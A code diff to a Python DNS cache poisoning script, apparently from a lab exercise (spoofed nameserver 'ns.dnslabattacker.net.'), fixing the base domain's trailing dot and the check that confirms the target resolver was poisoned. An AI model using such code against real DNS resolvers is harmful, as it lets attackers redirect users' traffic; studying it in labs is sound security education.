@@ -23,7 +23,7 @@ my_port = args.port
 dns_port = args.dns_port
 # port that your bind uses to send its DNS queries
 query_port = args.query_port
-base_domain = 'example.com'
+base_domain = 'example.com.'
 spoof = 'ns.dnslabattacker.net.'
 
 
@@ -88,7 +88,7 @@ def attack():
         data = sock.recv(1024)
         res = DNS(data[2:])
         try:
-            if res[DNS].ns[0].rdata == spoof:
+            if res[DNS].ns and res[DNS].ns.rdata == spoof:
                 print "Successfully poisonned our target with a dummy record !!"
                 break
             else:
